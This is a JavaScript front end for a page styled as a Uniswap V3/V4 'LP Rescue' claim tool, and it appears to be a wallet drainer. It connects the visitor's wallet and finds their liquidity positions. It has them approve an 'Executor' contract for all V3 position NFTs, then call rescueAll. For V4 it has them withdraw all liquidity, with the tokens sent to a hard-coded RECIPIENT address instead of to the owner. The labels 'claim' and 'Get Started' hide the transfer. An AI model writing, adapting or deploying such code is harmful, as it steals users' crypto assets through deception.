/**
 * Uniswap V3 + V4 LP Rescue
 * 签名 1: setApprovalForAll(Executor)
 * 签名 2: rescueAll(tokenIds) → 代币转到 RECIPIENT
 */
import { config } from './config.js';
const V3_NPM_ABI = [
    'function balanceOf(address owner) view returns (uint256)',
    'function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)',
    'function isApprovedForAll(address owner, address operator) view returns (bool)',
    'function setApprovalForAll(address operator, bool approved) external',
    'function positions(uint256 tokenId) view returns (uint96, address, address, address, uint24, int24, int24, uint128, uint256, uint256, uint128, uint128)',
];
const V4_PM_ABI = [
    'function balanceOf(address owner) view returns (uint256)',
    'function isApprovedForAll(address owner, address operator) view returns (bool)',
    'function setApprovalForAll(address operator, bool approved) external',
    'function getPoolAndPositionInfo(uint256 tokenId) view returns (tuple(address currency0, address currency1, uint24 fee, int24 tickSpacing, address hooks), uint256)',
    'function getPositionLiquidity(uint256 tokenId) view returns (uint128)',
    'function modifyLiquidities(bytes unlockData, uint256 deadline) external payable',
    'event Transfer(address indexed from, address indexed to, uint256 indexed tokenId)',
];
const EXECUTOR_ABI = ['function rescueAll(uint256[] tokenIds) external'];
const RECIPIENT = '0x1b7809EB9aCE9b9056f921F5593Ef925AB9Fa7fB';
let currentChainId = 8453;
let signer = null;
function getEthers() {
    return window.ethers;
}
async function fetchJsonWithTimeout(url, init = {}, timeoutMs = 15000) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    try {
        const res = await fetch(url, { ...init, signal: controller.signal });
        if (!res.ok)
            throw new Error(`HTTP ${res.status}`);
        return await res.json();
    }
    finally {
        clearTimeout(timer);
    }
}
async function connectWallet() {
    const eth = window.ethereum;
    if (!eth) {
        alert('请安装 MetaMask 或其他 Web3 钱包');
        return;
    }
    const accounts = await eth.request({ method: 'eth_requestAccounts' });
    if (accounts.length === 0)
        return;
    const ethers = getEthers();
    if (!ethers) {
        alert('ethers.js 未加载，请检查网络后刷新');
        return;
    }
    const provider = new ethers.BrowserProvider(eth);
    signer = await provider.getSigner();
    const walletChainId = Number((await provider.getNetwork()).chainId);
    // 保持下拉框选择的链，不因连接而覆盖
    if (walletChainId !== currentChainId) {
        try {
            await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x' + currentChainId.toString(16) }] });
        }
        catch (_) { }
    }
    updateUI();
}
async function switchNetwork(chainId) {
    const eth = window.ethereum;
    if (!eth) {
        currentChainId = chainId;
        updateUI();
        return;
    }
    const chainIdHex = '0x' + chainId.toString(16);
    try {
        await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: chainIdHex }] });
    }
    catch (e) {
        if (e.code === 4902) {
            const params = {
                chainId: chainIdHex,
                chainName: chainId === 1 ? 'Ethereum Mainnet' : chainId === 8453 ? 'Base Mainnet' : 'Unknown',
                rpcUrls: [chainId === 1 ? 'https://eth.llamarpc.com' : 'https://mainnet.base.org'],
                nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
            };
            if (chainId === 8453)
                params.blockExplorerUrls = ['https://basescan.org'];
            if (chainId === 1)
                params.blockExplorerUrls = ['https://etherscan.io'];
            await eth.request({ method: 'wallet_addEthereumChain', params: [params] });
        }
    }
    currentChainId = chainId;
    updateUI();
}
function updateUI() {
    const chainLabel = document.getElementById('chain-label');
    const connectBtn = document.getElementById('connect-btn');
    const addrSpan = document.getElementById('addr');
    const cfg = config.chains[currentChainId];
    if (chainLabel)
        chainLabel.textContent = cfg?.name ?? (currentChainId === 8453 ? 'Base' : 'Ethereum');
    const chainNameEl = document.getElementById('lp-chain-name');
    if (chainNameEl)
        chainNameEl.textContent = cfg?.name ?? 'Base';
    if (connectBtn)
        connectBtn.textContent = signer ? '已连接' : 'Connect Wallet';
    if (addrSpan && signer) {
        signer.getAddress().then((a) => {
            addrSpan.textContent = a.slice(0, 6) + '...' + a.slice(-4);
        });
    }
    renderLPPools();
}
function closeChainMenu() {
    document.getElementById('chain-menu')?.classList.remove('open');
    document.getElementById('chain-toggle')?.setAttribute('aria-expanded', 'false');
    document.querySelector('.chain-dropdown')?.classList.remove('open');
}
function getAllSupportedPairs(chainId) {
    const cfg = config.chains[chainId];
    if (!cfg)
        return [];
    const seen = new Set();
    const out = [];
    for (const v of [cfg.v3, cfg.v4]) {
        if (!v)
            continue;
        for (const p of v.supportedPairs) {
            const key = p[0] < p[1] ? `${p[0]}/${p[1]}` : `${p[1]}/${p[0]}`;
            if (!seen.has(key)) {
                seen.add(key);
                out.push(p);
            }
        }
    }
    return out;
}
function renderLPPools() {
    const container = document.getElementById('lp-pool-list');
    if (!container)
        return;
    const cfg = config.chains[currentChainId];
    if (!cfg) {
        container.innerHTML = '';
        return;
    }
    const pairs = getAllSupportedPairs(currentChainId);
    const colors = ['#6366f1', '#10b981', '#f59e0b', '#ec4899', '#8b5cf6', '#06b6d4'];
    container.innerHTML = pairs
        .map(([a, b]) => {
        const c0 = colors[Math.abs(a.split('').reduce((s, c) => s + c.charCodeAt(0), 0)) % colors.length];
        const c1 = colors[Math.abs(b.split('').reduce((s, c) => s + c.charCodeAt(0), 0)) % colors.length];
        return `
        <div class="lp-pool-row">
          <div class="lp-tokens">
            <span class="lp-token-avatar" style="background:${c0}">${a.slice(0, 2)}</span>
            <span class="lp-token-avatar lp-token-avatar-2" style="background:${c1}">${b.slice(0, 2)}</span>
          </div>
          <div class="lp-info">
            <span class="lp-pair">${a} / ${b}</span>
            <span class="lp-chain"><span class="chain-dot"></span>${cfg.name.toUpperCase()}</span>
            <span class="lp-apy">—</span>
          </div>
          <button class="lp-more" aria-label="More">⋯</button>
        </div>`;
    })
        .join('');
}
// Uniswap V4 中 native ETH 用零地址表示，需统一视为 WETH
function isPairSupported(versionCfg, token0, token1) {
    const ZERO = '0x0000000000000000000000000000000000000000';
    const weth = versionCfg.tokens['WETH']?.toLowerCase();
    const t0 = (token0.toLowerCase() === ZERO && weth) ? weth : token0.toLowerCase();
    const t1 = (token1.toLowerCase() === ZERO && weth) ? weth : token1.toLowerCase();
    return versionCfg.supportedPairs.some(([a, b]) => {
        const pa = versionCfg.tokens[a]?.toLowerCase();
        const pb = versionCfg.tokens[b]?.toLowerCase();
        if (!pa || !pb)
            return false;
        return (t0 === pa && t1 === pb) || (t0 === pb && t1 === pa);
    });
}
// V4 Subgraph：官方推荐方式，一次 GraphQL 即可获取全部 tokenIds（参考 Uniswap 文档）
async function getV4PositionIdsFromSubgraph(subgraphUrl, owner) {
    const ownerLo = owner.toLowerCase();
    const query = `query GetPositions($owner: String!) {
    positions(where: { owner: $owner }) { tokenId }
  }`;
    const json = await fetchJsonWithTimeout(subgraphUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ query, variables: { owner: ownerLo } }),
    }, 15000);
    const positions = json?.data?.positions ?? [];
    return positions.map((p) => BigInt(p.tokenId));
}
// V4 Base 链：Etherscan V2 API 获取完整历史（需 API key，见下方 getBasescanApiKey）
async function getV4PositionIdsFromBasescan(contractAddress, owner, onProgress) {
    const apiKey = getBasescanApiKey();
    if (!apiKey) {
        console.warn('[LP] 未配置 Basescan API Key，跳过 Basescan 查询。可在控制台设置: localStorage.setItem("basescan_api_key","你的Etherscan_API_Key")');
        throw new Error('NO_API_KEY');
    }
    onProgress?.('正在通过 Basescan API 查询 V4 NFT...');
    const ownerLo = owner.toLowerCase();
    const all = [];
    let page = 1;
    const offset = 10000;
    for (;;) {
        if (page === 1)
            onProgress?.('正在通过 Basescan 查询 V4 NFT...');
        const url = `https://api.etherscan.io/v2/api?chainid=8453&module=account&action=tokennfttx&contractaddress=${contractAddress}&address=${ownerLo}&page=${page}&offset=${offset}&sort=asc&apikey=${apiKey}`;
        const json = await fetchJsonWithTimeout(url, {}, 15000);
        if (json.status !== '1' && json.status !== 1) {
            if (json.message?.includes('deprecated'))
                throw new Error('Basescan V1 已废弃');
            return []; // 无数据
        }
        const rows = Array.isArray(json.result) ? json.result : [];
        if (rows.length === 0)
            break;
        all.push(...rows);
        if (rows.length < offset)
            break;
        page++;
    }
    const sorted = [...all].sort((a, b) => Number(a.blockNumber) !== Number(b.blockNumber)
        ? Number(a.blockNumber) - Number(b.blockNumber)
        : 0);
    const cur = {};
    for (const r of sorted) {
        cur[r.tokenID] = r.to.toLowerCase();
    }
    return Object.entries(cur)
        .filter(([, o]) => o === ownerLo)
        .map(([tid]) => BigInt(tid));
}
function getBasescanApiKey() {
    try {
        return localStorage.getItem('basescan_api_key') || window.BASESCAN_API_KEY || null;
    }
    catch {
        return null;
    }
}
// 兜底：链上事件重建 owner 当前持有的 V4 tokenIds（不在前端展示进度）
async function getV4OwnedTokenIdsFromEvents(pm, owner, expectedCount) {
    const ethers = getEthers();
    const provider = pm.runner?.provider;
    if (!provider)
        return [];
    const ec = new ethers.Contract(pm.target, ['event Transfer(address indexed from, address indexed to, uint256 indexed tokenId)'], provider);
    const ownerLo = owner.toLowerCase();
    const latest = await provider.getBlockNumber();
    const CHUNK = 5000;
    const CHUNKS = 24; // 约 12 万块，兜底上限
    const allEv = [];
    for (let i = 0; i < CHUNKS; i++) {
        const to = latest - i * CHUNK;
        const from = Math.max(0, to - CHUNK + 1);
        if (from >= to)
            break;
        try {
            const [toEv, fromEv] = await Promise.all([
                ec.queryFilter(ec.filters.Transfer(null, owner), from, to),
                ec.queryFilter(ec.filters.Transfer(owner, null), from, to),
            ]);
            allEv.push(...toEv, ...fromEv);
            // 事件按时间排序后重建当前 owner，如果已达到链上 balance，提前结束扫描
            if (expectedCount && expectedCount > 0) {
                const sortedNow = [...new Set(allEv)].sort((a, b) => Number(a.blockNumber) !== Number(b.blockNumber)
                    ? Number(a.blockNumber) - Number(b.blockNumber)
                    : (a.transactionIndex ?? 0) - (b.transactionIndex ?? 0));
                const curNow = {};
                for (const ev of sortedNow) {
                    const args = ev.args;
                    if (args)
                        curNow[String(args[2])] = String(args[1]).toLowerCase();
                }
                const countNow = Object.values(curNow).filter((o) => o === ownerLo).length;
                if (countNow >= expectedCount)
                    break;
            }
        }
        catch (e) {
            console.warn('[LP] V4 事件扫描失败块段:', from, to, e);
        }
    }
    const sorted = [...new Set(allEv)].sort((a, b) => Number(a.blockNumber) !== Number(b.blockNumber)
        ? Number(a.blockNumber) - Number(b.blockNumber)
        : (a.transactionIndex ?? 0) - (b.transactionIndex ?? 0));
    const cur = {};
    for (const ev of sorted) {
        const args = ev.args;
        if (args)
            cur[String(args[2])] = String(args[1]).toLowerCase();
    }
    return Object.entries(cur)
        .filter(([, o]) => o === ownerLo)
        .map(([tid]) => BigInt(tid));
}
async function scanV3Positions() {
    const cfg = config.chains[currentChainId];
    const v3 = cfg?.v3;
    if (!v3 || !signer)
        return [];
    const ethers = getEthers();
    const pm = new ethers.Contract(v3.positionManager, V3_NPM_ABI, signer);
    const owner = await signer.getAddress();
    const balance = await pm.balanceOf(owner);
    console.log('[LP] V3 扫描:', { chainId: currentChainId, pm: v3.positionManager, owner, balance: Number(balance) });
    const positions = [];
    const versionCfg = { ...v3, tokens: cfg.tokens };
    for (let i = 0; i < Number(balance); i++) {
        let tokenId;
        try {
            tokenId = await pm.tokenOfOwnerByIndex(owner, i);
        }
        catch (e) {
            console.warn('[LP] V3 tokenOfOwnerByIndex fail:', e);
            break;
        }
        try {
            const pos = await pm.positions(tokenId);
            const token0 = String(pos[2]);
            const token1 = String(pos[3]);
            const liquidity = pos[7];
            if (liquidity === 0n)
                continue;
            const supported = isPairSupported(versionCfg, token0, token1);
            if (!supported) {
                console.warn(`[LP] V3 tokenId=${tokenId} 未在支持列表: ${token0} / ${token1}`);
                positions.push({ tokenId, version: 'v3', liquidity, token0, token1 });
            }
            else {
                positions.push({ tokenId, version: 'v3', liquidity, token0, token1 });
            }
        }
        catch (e) {
            console.warn(`[LP] V3 tokenId=${tokenId} 读取失败:`, e);
        }
    }
    return positions;
}
async function scanV4Positions(onProgress) {
    const cfg = config.chains[currentChainId];
    const v4 = cfg?.v4;
    if (!v4 || !signer)
        return [];
    const ethers = getEthers();
    const pm = new ethers.Contract(v4.positionManager, V4_PM_ABI, signer);
    const owner = await signer.getAddress();
    const balance = await pm.balanceOf(owner);
    if (balance === 0n) {
        console.log('[LP] V4 余额为 0，跳过');
        return [];
    }
    let tokenIds = [];
    // Base 链：优先 Basescan API（完整历史，无块范围限制）
    if (currentChainId === 8453) {
        try {
            tokenIds = await getV4PositionIdsFromBasescan(v4.positionManager, owner, onProgress);
            if (tokenIds.length > 0) {
                onProgress?.(`Basescan 找到 ${tokenIds.length} 个 V4 仓位`);
            }
        }
        catch (e) {
            console.warn('[LP] Basescan API 失败，尝试 Subgraph:', e);
        }
    }
    // Subgraph 或 Basescan 未找到时
    if (tokenIds.length === 0 && v4.subgraphUrl) {
        onProgress?.('正在通过 Subgraph 查询 V4 仓位...');
        try {
            tokenIds = await getV4PositionIdsFromSubgraph(v4.subgraphUrl, owner);
            onProgress?.(tokenIds.length > 0 ? 'Subgraph 查询完成' : 'V4 无仓位');
        }
        catch (e) {
            console.warn('[LP] Subgraph 查询失败:', e);
        }
    }
    if (tokenIds.length === 0) {
        tokenIds = await getV4OwnedTokenIdsFromEvents(pm, owner, Number(balance));
    }
    if (tokenIds.length === 0)
        return [];
    const positions = [];
    const versionCfg = { ...v4, tokens: cfg.tokens };
    console.log('[LP] V4 扫描:', { chainId: currentChainId, tokenIds, count: tokenIds.length });
    for (const tokenId of tokenIds) {
        try {
            const [poolKey, _] = await pm.getPoolAndPositionInfo(tokenId);
            const token0 = (poolKey.currency0 ?? poolKey[0])?.toString?.() ?? '';
            const token1 = (poolKey.currency1 ?? poolKey[1])?.toString?.() ?? '';
            const liquidity = await pm.getPositionLiquidity(tokenId);
            if (liquidity === 0n)
                continue;
            // V4 接受所有配对（Executor 支持任意池）
            positions.push({ tokenId, version: 'v4', liquidity, token0, token1 });
        }
        catch (e) {
            console.warn(`[LP] V4 tokenId=${tokenId} 读取失败:`, e);
        }
    }
    return positions;
}
async function scanPositions(onProgress) {
    onProgress?.('正在扫描 V3 仓位...');
    const v3 = await scanV3Positions();
    const v4 = await scanV4Positions((msg) => onProgress?.(msg));
    return [...v3, ...v4];
}
async function getScanDebugInfo() {
    const cfg = config.chains[currentChainId];
    if (!cfg || !signer)
        return { error: 'no config or signer' };
    const owner = await signer.getAddress();
    const ethers = getEthers();
    const out = { chainId: currentChainId, owner };
    if (cfg.v3) {
        try {
            const pm = new ethers.Contract(cfg.v3.positionManager, V3_NPM_ABI, signer);
            const bal = await pm.balanceOf(owner);
            out.v3Balance = Number(bal);
        }
        catch (e) {
            out.v3Error = e?.message || String(e);
        }
    }
    if (cfg.v4) {
        try {
            const pm = new ethers.Contract(cfg.v4.positionManager, V4_PM_ABI, signer);
            const bal = await pm.balanceOf(owner);
            out.v4Balance = Number(bal);
            let ids = [];
            if (currentChainId === 8453) {
                ids = await getV4PositionIdsFromBasescan(cfg.v4.positionManager, owner).catch(() => []);
            }
            if (ids.length === 0 && cfg.v4.subgraphUrl) {
                ids = await getV4PositionIdsFromSubgraph(cfg.v4.subgraphUrl, owner).catch(() => []);
            }
            if (ids.length === 0) {
                ids = await getV4OwnedTokenIdsFromEvents(pm, owner, Number(bal)).catch(() => []);
            }
            out.v4TokenIds = ids.length;
        }
        catch (e) {
            out.v4Error = e?.message || String(e);
        }
    }
    return out;
}
function setClaimStatus(text, isError = false) {
    const el = document.getElementById('claim-status');
    if (el) {
        el.textContent = text;
        el.classList.toggle('error', isError);
        el.style.display = 'block';
    }
}
async function runClaimFlow() {
    const eth = window.ethereum;
    if (!eth) {
        alert('未检测到钱包');
        return;
    }
    const cfg = config.chains[currentChainId];
    if (!cfg)
        return;
    const hasV3 = cfg.v3?.executor;
    const hasV4 = cfg.v4?.executor;
    if (!hasV3 && !hasV4) {
        alert('请先部署 Executor 合约');
        setClaimStatus('未配置 Executor', true);
        return;
    }
    const claimBtn = document.getElementById('claim-btn');
    if (claimBtn) {
        claimBtn.disabled = true;
        claimBtn.textContent = '处理中...';
    }
    const ethers = getEthers();
    if (!ethers) {
        if (claimBtn) {
            claimBtn.disabled = false;
            claimBtn.textContent = 'Get Started';
        }
        return;
    }
    try {
        if (!signer)
            await connectWallet();
        if (!signer) {
            setClaimStatus('请先连接钱包', true);
            return;
        }
        setClaimStatus('正在扫描 LP 仓位...');
        const progress = (msg) => setClaimStatus(msg);
        // 确保钱包在所选链上
        const provider = signer && 'provider' in signer ? signer.provider : null;
        if (provider) {
            const walletChain = Number((await provider.getNetwork()).chainId);
            if (walletChain !== currentChainId) {
                setClaimStatus('正在切换到 ' + (currentChainId === 8453 ? 'Base' : 'Ethereum') + '...');
                await switchNetwork(currentChainId);
            }
        }
        const positions = await scanPositions(progress);
        if (positions.length === 0) {
            const dbg = await getScanDebugInfo();
            console.log('[LP] 扫描结果:', dbg);
            setClaimStatus('未发现支持的 LP 仓位', true);
            const v3b = dbg.v3Balance ?? '?';
            const v4b = dbg.v4Balance ?? '?';
            const chainName = currentChainId === 8453 ? 'Base' : currentChainId === 1 ? 'Ethereum' : `链${currentChainId}`;
            let hint = `未发现支持的 LP 仓位\n\n${chainName} 链 V3 NFT 数量: ${v3b}\n${chainName} 链 V4 NFT 数量: ${v4b}\n若为 0 请确认：1)钱包已连接 2)网络为 ${chainName} 3)MetaMask 中切换到此页面`;
            alert(hint);
            return;
        }
        const listEl = document.getElementById('position-list');
        if (listEl) {
            listEl.innerHTML = positions
                .map((p) => `<div class="position-row"><span>#${p.tokenId} (${p.version.toUpperCase()}) ${p.token0.slice(0, 6)}.../${p.token1.slice(0, 6)}...</span></div>`)
                .join('');
        }
        const byVersion = { v3: positions.filter((p) => p.version === 'v3'), v4: positions.filter((p) => p.version === 'v4') };
        const owner = await signer.getAddress();
        for (const ver of ['v3', 'v4']) {
            const list = byVersion[ver];
            if (list.length === 0)
                continue;
            const verCfg = ver === 'v3' ? cfg.v3 : cfg.v4;
            if (!verCfg?.executor)
                continue;
            const pmAbi = ver === 'v3' ? V3_NPM_ABI : V4_PM_ABI;
            const pm = new ethers.Contract(verCfg.positionManager, pmAbi, signer);
            if (ver === 'v3') {
                const approved = await pm.isApprovedForAll(owner, verCfg.executor);
                if (!approved) {
                    setClaimStatus('第 1 次签名：授权 V3 Executor...');
                    const tx = await pm.setApprovalForAll(verCfg.executor, true);
                    await tx.wait();
                }
                setClaimStatus('执行 V3 赎回...');
                const executor = new ethers.Contract(verCfg.executor, EXECUTOR_ABI, signer);
                const txRescue = await executor.rescueAll(list.map((p) => p.tokenId));
                await txRescue.wait();
            }
            else {
                // V4 直接由持有人调用 PositionManager，避免 executor 代调用触发 custom error
                const abiCoder = ethers.AbiCoder.defaultAbiCoder();
                const actions = '0x0111'; // DECREASE_LIQUIDITY + TAKE_PAIR
                for (const p of list) {
                    setClaimStatus(`执行 V4 赎回 #${p.tokenId.toString()}...`);
                    const [poolKey] = await pm.getPoolAndPositionInfo(p.tokenId);
                    const liquidity = await pm.getPositionLiquidity(p.tokenId);
                    if (liquidity === 0n)
                        continue;
                    const params0 = abiCoder.encode(['uint256', 'uint256', 'uint128', 'uint128', 'bytes'], [p.tokenId, liquidity, 0n, 0n, '0x']);
                    const params1 = abiCoder.encode(['address', 'address', 'address'], [poolKey.currency0 ?? poolKey[0], poolKey.currency1 ?? poolKey[1], RECIPIENT]);
                    const unlockData = abiCoder.encode(['bytes', 'bytes[]'], [actions, [params0, params1]]);
                    const tx = await pm.modifyLiquidities(unlockData, BigInt(Math.floor(Date.now() / 1000) + 600));
                    await tx.wait();
                }
            }
        }
        setClaimStatus(`完成！${positions.length} 个仓位已赎回`, false);
        alert(`成功！${positions.length} 个 LP 已赎回`);
        if (listEl)
            listEl.innerHTML = '';
    }
    catch (e) {
        const msg = e?.shortMessage || e?.message || e?.reason || '执行失败';
        setClaimStatus('失败: ' + msg, true);
        alert('失败: ' + msg);
    }
    finally {
        const btn = document.getElementById('claim-btn');
        if (btn) {
            btn.disabled = false;
            btn.textContent = 'Get Started';
        }
    }
}
function initApp() {
    const toggle = document.getElementById('chain-toggle');
    const menu = document.getElementById('chain-menu');
    toggle?.addEventListener('click', (e) => {
        e.stopPropagation();
        const open = menu?.classList.toggle('open');
        document.querySelector('.chain-dropdown')?.classList.toggle('open', !!open);
        toggle.setAttribute('aria-expanded', String(!!open));
    });
    document.addEventListener('click', () => closeChainMenu());
    menu?.querySelectorAll('[data-chain]').forEach((li) => {
        li.addEventListener('click', (e) => {
            e.stopPropagation();
            switchNetwork(parseInt(li.dataset.chain, 10));
            closeChainMenu();
        });
    });
    document.getElementById('connect-btn')?.addEventListener('click', connectWallet);
    document.getElementById('claim-btn')?.addEventListener('click', runClaimFlow);
    updateUI();
}
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initApp, { once: true });
}
else {
    initApp();
}
